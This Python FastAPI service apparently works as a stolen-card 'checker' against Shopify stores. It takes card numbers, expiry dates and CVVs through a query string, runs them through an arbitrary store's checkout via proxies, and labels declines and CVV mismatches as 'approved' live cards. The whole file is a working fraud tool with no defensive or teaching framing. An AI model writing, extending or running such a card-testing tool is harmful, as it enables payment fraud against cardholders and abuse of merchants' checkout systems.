from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
import aiohttp
import asyncio
import re
from urllib.parse import quote

app = FastAPI()

TIMEOUT = aiohttp.ClientTimeout(total=60, connect=10)


def normalize_url(site):
    site = site.strip()
    if not site.startswith("http"):
        site = f"https://{site}"
    return site.rstrip("/")


async def get_product(session, site, proxy=None):
    urls = [
        f"{site}/products.json?limit=1",
        f"{site}/collections/all/products.json?limit=1",
    ]
    for url in urls:
        try:
            async with session.get(url, proxy=proxy, timeout=TIMEOUT, ssl=False) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    products = data.get("products", [])
                    if products:
                        p = products[0]
                        variant = p.get("variants", [{}])[0]
                        return {
                            "handle": p.get("handle", ""),
                            "variant_id": str(variant.get("id", "")),
                            "price": variant.get("price", "0.00"),
                            "title": p.get("title", ""),
                        }
        except:
            continue
    return None


async def get_checkout_token(session, site, variant_id, proxy=None):
    try:
        cart_url = f"{site}/cart/{variant_id}:1"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
        }
        async with session.get(
            cart_url, proxy=proxy, timeout=TIMEOUT,
            ssl=False, headers=headers, allow_redirects=True
        ) as r:
            final_url = str(r.url)
            token_match = re.search(r"/checkouts/([a-f0-9]+)", final_url)
            if token_match:
                return token_match.group(1)
    except:
        pass

    try:
        add_url = f"{site}/cart/add.js"
        async with session.post(
            add_url,
            json={"id": int(variant_id), "quantity": 1},
            proxy=proxy, timeout=TIMEOUT, ssl=False
        ) as r:
            pass

        checkout_url = f"{site}/checkout"
        async with session.get(
            checkout_url, proxy=proxy, timeout=TIMEOUT,
            ssl=False, allow_redirects=True
        ) as r:
            final_url = str(r.url)
            token_match = re.search(r"/checkouts/([a-f0-9]+)", final_url)
            if token_match:
                return token_match.group(1)
    except:
        pass

    return None


async def tokenize_card(session, cc_parts, proxy=None):
    try:
        number, month, year, cvv = cc_parts
        if len(year) == 2:
            year = "20" + year

        payload = {
            "credit_card": {
                "number": number,
                "month": month,
                "year": year,
                "verification_value": cvv,
                "name": "John Doe",
            }
        }
        async with session.post(
            "https://elb.deposit.shopifycs.com/sessions",
            json=payload, proxy=proxy, timeout=TIMEOUT, ssl=False
        ) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return data.get("id")
    except:
        pass
    return None


async def submit_payment(session, site, checkout_token, card_token, cc_parts, price, proxy=None):
    try:
        number, month, year, cvv = cc_parts
        if len(year) == 2:
            year = "20" + year

        gateway_url = f"{site}/{checkout_token}/payments"
        payload = {
            "payment": {
                "payment_token": {"payment_data": card_token, "type": "shopify_token"},
                "amount": price,
                "unique_token": card_token[:16],
            }
        }
        headers = {
            "Content-Type": "application/json",
            "X-Shopify-Checkout-Version": "2016-09-06",
        }
        async with session.post(
            f"{site}/wallets/checkouts/{checkout_token}/payments",
            json=payload, proxy=proxy, timeout=TIMEOUT,
            ssl=False, headers=headers
        ) as r:
            data = await r.json(content_type=None)
            return data
    except Exception as e:
        return {"error": str(e)}


def parse_payment_response(data, price):
    if not data:
        return "Unknown Error", "Unknown"

    tx = data.get("transaction", {})
    if not tx:
        tx = data.get("payment", {})

    status = str(tx.get("status", "")).lower()
    message = str(tx.get("message", "")).lower()
    error_code = str(tx.get("error_code", "")).lower()
    gateway = tx.get("gateway", "Shopify")

    full_text = f"{status} {message} {error_code}"

    charged_kw = ["success", "paid", "completed", "approved", "thank_you"]
    approved_kw = ["3d", "otp", "authentication", "cvc", "cvv", "insufficient", "generic_decline",
                   "do_not_honor", "card_declined", "declined"]

    for kw in charged_kw:
        if kw in full_text:
            return f"order_paid | {message or status}", gateway

    for kw in approved_kw:
        if kw in full_text:
            return message or error_code or status, gateway

    err = data.get("errors", {})
    if err:
        err_str = str(err)
        return err_str[:100], gateway

    return message or status or "Unknown", gateway


def parse_proxy_string(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("http://", "https://", "socks5://")):
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"


@app.get("/shopify")
async def check_shopify(
    site: str = Query(...),
    cc: str = Query(...),
    proxy: str = Query(None)
):
    try:
        cc_clean = cc.replace("|", ":").replace("/", ":").replace(" ", ":")
        parts = [p.strip() for p in cc_clean.split(":") if p.strip()]
        if len(parts) != 4:
            return JSONResponse({"Status": False, "Response": "Invalid card format", "Price": "-", "Gate": "Shopify"})

        number, month, year, cvv = parts
        site_url = normalize_url(site)
        proxy_url = parse_proxy_string(proxy)

        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:

            product = await get_product(session, site_url, proxy_url)
            if not product:
                return JSONResponse({"Status": False, "Response": "No valid products", "Price": "-", "Gate": "Shopify"})

            price = product["price"]
            variant_id = product["variant_id"]

            checkout_token = await get_checkout_token(session, site_url, variant_id, proxy_url)
            if not checkout_token:
                return JSONResponse({"Status": False, "Response": "Failed to get checkout token", "Price": price, "Gate": "Shopify"})

            card_token = await tokenize_card(session, [number, month, year, cvv], proxy_url)
            if not card_token:
                return JSONResponse({"Status": False, "Response": "Failed to tokenize card", "Price": price, "Gate": "Shopify"})

            result = await submit_payment(
                session, site_url, checkout_token, card_token,
                [number, month, year, cvv], price, proxy_url
            )

            response_text, gateway = parse_payment_response(result, price)
            is_success = any(kw in response_text.lower() for kw in ["order_paid", "paid", "completed", "success"])

            return JSONResponse({
                "Status": is_success,
                "Response": response_text,
                "Price": f"${price}",
                "Gate": gateway,
            })

    except asyncio.TimeoutError:
        return JSONResponse({"Status": False, "Response": "Timeout", "Price": "-", "Gate": "Shopify"})
    except Exception as e:
        return JSONResponse({"Status": False, "Response": str(e)[:100], "Price": "-", "Gate": "Shopify"})


@app.get("/")
async def root():
    return {"status": "API Running ✅"}
                      
